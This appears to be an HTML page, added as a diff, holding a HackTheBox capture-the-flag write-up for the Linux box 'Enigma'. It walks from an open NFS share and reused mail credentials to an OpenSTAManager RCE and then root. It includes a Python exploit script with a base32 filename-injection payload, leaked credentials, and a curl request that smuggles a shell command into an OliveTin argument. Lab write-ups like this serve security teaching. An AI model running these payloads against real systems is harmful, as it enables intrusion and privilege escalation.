@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<meta name="theme-color" content="#030305"/>
+<title>Enigma — HTB Write Up | pumkin</title>
+<meta name="description" content="HackTheBox Enigma (Easy, Linux) full write up: NFS share → mail credential reuse → OpenSTAManager RCE → database creds → OliveTin config injection → root."/>
+<link rel="icon" href="../cat.png"/>
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{--bg:#030305;--panel-bg:rgba(255,255,255,.03);--border:rgba(255,255,255,.06);--rose:#a855f7;--rose-dim:rgba(168,85,247,.15);--emerald:#34d399;--emerald-dim:rgba(52,211,153,.1);--text:#fafafa;--muted:#9ca3af;--dim:#6b7280}
+body{background:var(--bg);color:var(--text);font-family:'Inter',system-ui,-apple-system,sans-serif;min-height:100vh;overflow-x:hidden;position:relative}
+body::before{content:'';position:fixed;inset:0;background:linear-gradient(rgba(255,255,255,.015) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.015) 1px,transparent 1px);background-size:60px 60px;z-index:0;pointer-events:none}
+.cyber-grid{position:fixed;inset:0;z-index:0;pointer-events:none;overflow:hidden}
+.cyber-grid::before{content:'';position:absolute;width:100%;height:100%;background:radial-gradient(circle at 50% 0%,rgba(168,85,247,.08) 0%,transparent 50%),radial-gradient(circle at 80% 80%,rgba(52,211,153,.04) 0%,transparent 50%)}
+main{position:relative;z-index:1;min-height:100vh;width:100%;padding:2rem 1rem}
+@media(min-width:768px){main{padding:3rem 2rem}}
+.max-w{max-width:72rem;width:100%;margin:0 auto}
+.nav-row{display:flex;align-items:center;gap:1rem;margin-bottom:2rem;flex-wrap:wrap}
+.back-btn{display:inline-flex;align-items:center;gap:.5rem;padding:.5rem 1rem;border-radius:.75rem;background:var(--panel-bg);border:1px solid var(--border);color:var(--muted);text-decoration:none;font-family:'JetBrains Mono','Fira Code',monospace;font-size:.75rem;text-transform:uppercase;letter-spacing:.1em;transition:all .3s ease}
+.back-btn:hover{color:#c084fc;border-color:rgba(168,85,247,.5)}
+.back-btn svg{transition:transform .3s ease}
+.back-btn:hover svg{transform:translateX(-4px)}
+.panel{background:#0a0b0f;border:1px solid var(--border);border-radius:1rem;position:relative;overflow:hidden}
+.writeup-body{padding:2rem;max-width:60rem;margin:0 auto}
+@media(min-width:768px){.writeup-body{padding:3rem}}
+.meta{color:var(--dim);font-size:.75rem;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.1em;text-transform:uppercase;margin-bottom:1rem}
+h1{font-size:1.75rem;font-weight:800;letter-spacing:-.03em;color:white;text-transform:uppercase;margin-bottom:1.5rem}
+@media(min-width:768px){h1{font-size:2.5rem}}
+.writeup-body h2{font-size:1.25rem;font-weight:700;color:#c084fc;margin:2.5rem 0 1rem;padding-bottom:.5rem;border-bottom:1px solid var(--border)}
+.writeup-body h3{font-size:1rem;font-weight:700;color:#34d399;margin:1.5rem 0 .75rem}
+.writeup-body p{color:var(--muted);font-size:.95rem;line-height:1.75;margin-bottom:1rem}
+.writeup-body ul,.writeup-body ol{color:var(--muted);font-size:.95rem;line-height:1.75;margin:0 0 1rem 1.25rem}
+.writeup-body li{margin-bottom:.25rem}
+.writeup-body strong{color:var(--text)}
+.writeup-body code{font-family:'JetBrains Mono','Fira Code',monospace;font-size:.85rem;background:rgba(168,85,247,.1);color:#c084fc;padding:2px 6px;border-radius:6px}
+.writeup-body pre{background:rgba(0,0,0,.5);border:1px solid var(--border);border-radius:.75rem;padding:1rem;margin:1rem 0;font-family:'JetBrains Mono','Fira Code',monospace;font-size:.8rem;color:var(--emerald);line-height:1.6;white-space:pre-wrap;word-wrap:break-word;overflow-wrap:anywhere}
+.writeup-body pre code{background:none;color:inherit;padding:0;border-radius:0}
+.section-tag{display:inline-block;padding:2px 10px;border-radius:9999px;font-size:.7rem;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.1em;text-transform:uppercase}
+.tag-easy{background:rgba(52,211,153,.1);border:1px solid rgba(52,211,153,.3);color:#34d399}
+.tag-linux{background:rgba(52,211,153,.1);border:1px solid rgba(52,211,153,.3);color:#34d399}
+.info-grid{display:grid;grid-template-columns:1fr;gap:.75rem;margin:1rem 0}
+@media(min-width:768px){.info-grid{grid-template-columns:repeat(3,1fr)}}
+.info-cell{background:rgba(0,0,0,.3);border:1px solid var(--border);border-radius:.75rem;padding:1rem}
+.info-cell .lbl{color:var(--dim);font-size:.65rem;font-family:'JetBrains Mono','Fira Code',monospace;text-transform:uppercase;letter-spacing:.1em;margin-bottom:.25rem}
+.info-cell .val{color:var(--text);font-size:.9rem;font-weight:600}
+.footer{text-align:center;padding-top:3rem;color:var(--dim);font-size:10px;font-family:'JetBrains Mono','Fira Code',monospace;letter-spacing:.15em;text-transform:uppercase}
+.fade-in{opacity:0;transform:translateY(20px);transition:opacity .6s ease,transform .6s ease}
+.fade-in.visible{opacity:1;transform:translateY(0)}
+</style>
+</head>
+<body>
+<div class="cyber-grid"></div>
+
+<main>
+<div class="max-w">
+  <div class="nav-row fade-in">
+    <a href="../writeups.html" class="back-btn">
+      <svg class="icon-sm" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m12 19-7-7 7-7"/><path d="M19 12H5"/></svg>
+      Write Ups
+    </a>
+    <a href="../index.html" class="back-btn">Home</a>
+  </div>
+
+  <div class="panel fade-in">
+    <div class="writeup-body">
+
+      <p class="meta">hackthebox / easy / linux</p>
+      <h1>Enigma</h1>
+
+      <div class="info-grid">
+        <div class="info-cell"><div class="lbl">Platform</div><div class="val">HackTheBox</div></div>
+        <div class="info-cell"><div class="lbl">Difficulty</div><div class="val"><span class="section-tag tag-easy">Easy</span></div></div>
+        <div class="info-cell"><div class="lbl">OS</div><div class="val"><span class="section-tag tag-linux">Linux</span></div></div>
+      </div>
+
+      <h2>Summary</h2>
+      <p>Enigma chains a handful of classic techniques together. A <strong>misconfigured NFS share</strong> leaks an internal PDF, which points to the mail server where <strong>credential reuse</strong> unlocks a hidden support panel running an <strong>authenticated RCE in OpenSTAManager</strong>. From the resulting <code>www-data</code> shell, database credentials found in config lead to a cracked hash and <code>haris</code>, whose port-forwarded service (<strong>OliveTin</strong>) has an unauthenticated action whose shell command is injectable — straight to root.</p>
+
+      <h2>Skills Required</h2>
+      <ul>
+        <li>Service identification and NFS enumeration</li>
+        <li>Basic web exploitation and CVE research</li>
+      </ul>
+
+      <h2>Skills Learned</h2>
+      <ul>
+        <li>Mounting and mining NFS shares for leaked credentials</li>
+        <li>Reusing credentials across mail and web services</li>
+        <li>OpenSTAManager authenticated RCE (CVE-2025-69212)</li>
+        <li>Injecting into OliveTin's action shell commands</li>
+      </ul>
+
+      <h2>Enumeration</h2>
+      <p>A full port scan shows the usual suspects plus a couple of unusual services: SSH, a redirecting nginx, mail (POP3/IMAP) and an <strong>NFS service</strong>.</p>
+      <pre>Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-29 05:40 -0400
+Nmap scan report for 10.129.35.69
+Host is up (0.048s latency).
+Not shown: 992 closed tcp ports (reset)
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
+80/tcp   open  http     nginx 1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://enigma.htb/
+110/tcp  open  pop3     Dovecot pop3d
+111/tcp  open  rpcbind  2-4 (RPC #100000)
+143/tcp  open  imap     Dovecot imapd (Ubuntu)
+993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
+995/tcp  open  ssl/pop3 Dovecot pop3d
+2049/tcp open  nfs_acl  3 (RPC #100227)</pre>
+
+      <h3>NFS share</h3>
+      <p>The presence of NFS is unusual — let's look at it. The <code>/share</code> export is mountable without auth.</p>
+      <pre>mkdir /tmp/nfs
+mount -t nfs TARGET:/share /tmp/nfs -o nolock    # mount share
+ls -la /tmp/nfs                                  # list files
+umount /tmp/nfs</pre>
+      <p>Inside is a PDF. It references the mail server and a user named <strong>Kevin</strong>, along with (implied) credentials.</p>
+
+      <h3>Mail server</h3>
+      <p>Connecting to the POP3 service over TLS and reading Kevin's only email yields another set of credentials — this time for a hidden support panel.</p>
+      <pre>openssl s_client -connect 10.129.35.69:995 -crlf -quiet
+
+URL: http://support_001.enigma.htb
+Username: admin
+Password: Ne3s4rtars78s</pre>
+
+      <h2>Foothold</h2>
+      <h3>OpenSTAManager authenticated RCE</h3>
+      <p>The support panel runs <strong>OpenSTAManager 2.9.8</strong>. Research points to <strong>CVE-2025-69212</strong>, an authenticated RCE in the invoice importer: an uploaded <code>.p7m</code> file is passed to <code>exec('openssl smime -verify ... "'.$file.'"')</code> where the attacker-controlled filename is evaluated by <code>/bin/sh</code>. Since filenames can't contain <code>/</code>, the payload is base32-encoded and decoded at runtime.</p>
+      <pre>#!/usr/bin/env python3
+# CVE-2025-69212 — OpenSTAManager &lt;= 2.9.8 authenticated RCE
+# Sink: src/Util/XML.php :: decodeP7M()
+#   exec('openssl smime -verify -noverify -in "'.$file.'" -inform DER -out "'.$output_file.'"')
+# Command substitution $( ) is evaluated by /bin/sh even inside double quotes.
+
+import argparse, base64, sys, time, requests
+
+def b32(s):
+    return base64.b32encode(s.encode()).decode()
+
+def fname(payload):
+    return "z$(echo${IFS}" + b32(payload) + "|base32${IFS}-d|bash).p7m"
+
+def login(s, base, user, pw):
+    s.get(base + "/")
+    s.post(base + "/index.php?op=login", data={"username": user, "password": pw})
+    if "op=logout" not in s.get(base + "/").text:
+        sys.exit("[-] login failed")
+
+def fire(s, base, payload, id_module, id_plugin):
+    fn = fname(payload)
+    try:
+        s.post(base + "/actions.php",
+               data={"op": "save", "id_module": id_module, "id_plugin": id_plugin},
+               files={"blob": (fn, b"&lt;x/&gt;", "application/octet-stream")},
+               timeout=8)
+    except requests.exceptions.RequestException:
+        pass  # blocking exec (reverse shell) holds the connection
+
+def run_blind(s, base, cmd, webroot, cwd=None):
+    marker = "RCEOUT"
+    out = f"{webroot}/o.txt"
+    prefix = f'cd {cwd} 2>/dev/null; ' if cwd else ''
+    payload = f"{{ {prefix}{cmd} ; echo {marker}; }} &gt; {out} 2&gt;&amp;1"
+    fire(s, base, payload, "14", "19")
+    for _ in range(15):
+        r = s.get(base + "/o.txt")
+        if marker in r.text:
+            return r.text.split(marker)[0]
+        time.sleep(0.5)
+    return "[-] no output\n"
+
+# ... interactive shell + main() omitted for brevity ...
+# usage:
+#   ./CVE-2025-69212.py -u URL -l admin -p 'Ne3s4rtars78s' -s LHOST -P LPORT</pre>
+      <p>Running the exploit delivers a shell as <strong>www-data</strong>.</p>
+
+      <h2>Lateral Movement</h2>
+      <h3>Database credentials</h3>
+      <p>LinPEAS finds the application database credentials in its config.</p>
+      <pre>$db_host = 'localhost';
+$db_username = 'brollin';
+$db_password = 'Fri3nds@9099';
+$db_name = 'openstamanager';</pre>
+      <p>Dumping the users table reveals a password hash.</p>
+      <pre>mysql -u brollin -p'Fri3nds@9099' -h localhost openstamanager
+# or
+mysql -u brollin -p'Fri3nds@9099' -e "use openstamanager; select * from zz_users;" 2>/dev/null</pre>
+      <p>The hash cracks with <code>hashcat -m 3200</code>:</p>
+      <pre>user: haris
+pass: bestfriends</pre>
+      <p>SSH isn't reachable with it, so we <code>su haris</code> from the www-data shell.</p>
+
+      <h3>SSH for stability</h3>
+      <p>An SSH key makes the connection persistent and enables port forwarding.</p>
+      <pre>mkdir -p ~/.ssh
+ssh-keygen -t rsa -f ~/.ssh/id_rsa -N ""
+cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
+chmod 700 ~/.ssh
+chmod 600 ~/.ssh/id_rsa
+# copy the private key, then on the attacker box:
+chmod 600 id_haris
+ssh -i id_haris haris@enigma.htb</pre>
+
+      <h2>Privilege Escalation</h2>
+      <h3>Port forwarding to OliveTin</h3>
+      <p>A local service on port <strong>1337</strong> runs <strong>OliveTin</strong> (a web UI for running shell commands). Forward it and grab the user flag.</p>
+      <pre>ssh -i id_haris -L 1337:127.0.0.1:1337 haris@enigma.htb</pre>
+
+      <h3>Unauthenticated command injection</h3>
+      <p>OliveTin's config defines a <code>backup_database</code> action that shells out to <code>mysqldump</code>, and it is configured with <code>authRequireGuestsToLogin: false</code> plus <code>exec: true</code> for guests — so anyone can trigger actions with arbitrary arguments, no login needed.</p>
+      <pre># /etc/OliveTin/config.yaml
+- title: Backup Database
+  id: backup_database
+  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"</pre>
+      <p>Because the <code>db_pass</code> argument is dropped into single quotes inside a <code>/bin/sh</code> command line, a crafted value closes the quote and injects a command that is run as root.</p>
+      <pre>curl -s -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"actionId": "backup_database", "arguments": [
+        {"name": "db_user", "value": "backup_svc"},
+        {"name": "db_pass", "value": "x'\'' ; cat /root/root.txt ; #"},
+        {"name": "db_name", "value": "production"}]}' \
+  http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartActionAndWait</pre>
+      <p>The action executes <code>mysqldump</code> as the OliveTin service user (root), our injected <code>cat /root/root.txt</code> runs, and the box is owned.</p>
+
+      <h2>Key Takeaways</h2>
+      <ul>
+        <li><strong>NFS exports with no auth</strong> are a free foothold — always mount and list them.</li>
+        <li><strong>Password reuse</strong> across mail, web panels and OS accounts makes one leak a whole path.</li>
+        <li><strong>Command substitution inside quoted <code>system()</code>/shell templates</strong> is injectable — never build shell commands from untrusted arguments.</li>
+        <li><strong>Look for the hidden vhosts</strong> — <code>support_001</code> only showed up after the mail lead, not from directory brute force.</li>
+      </ul>
+
+    </div>
+  </div>
+
+  <p class="footer">pumkin / write ups</p>
+</div>
+</main>
+
+<script>
+const observer = new IntersectionObserver((entries) => {
+  entries.forEach(entry => {
+    if (entry.isIntersecting) {
+      entry.target.classList.add('visible');
+    }
+  });
+}, { threshold: 0 });
+
+document.querySelectorAll('.fade-in').forEach(el => observer.observe(el));
+</script>
+</body>
+</html>
